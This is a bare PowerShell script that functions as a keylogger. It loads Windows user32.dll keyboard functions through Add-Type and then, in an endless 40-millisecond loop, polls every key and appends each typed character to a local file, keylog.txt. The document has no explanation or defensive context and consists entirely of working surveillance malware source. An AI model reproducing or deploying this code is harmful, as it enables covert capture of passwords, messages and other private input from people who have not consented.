$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$built_api = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
$output_path = "keylog.txt"
$null = New-Item -Path $output_path -ItemType File -Force

while ($true) {
    Sleep -Milliseconds 40
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        $state = $built_api::GetAsyncKeyState($ascii)
        if ($state -eq -32767) {
            $null = [console]::CapsLock
            $virtual_key = $built_api::MapVirtualKey($ascii, 3)
            $key_state = New-Object Byte[] 256
            $check_key_state = $built_api::GetKeyboardState($key_state)
            $current_char = New-Object -TypeName System.Text.StringBuilder
            $success = $built_api::ToUnicode($ascii, $virtual_key, $key_state, $current_char, $current_char.Capacity, 0)
            if ($success) {
                [System.IO.File]::AppendAllText($output_path, $current_char, [System.Text.Encoding]::Unicode) 
            }
        }
    }
}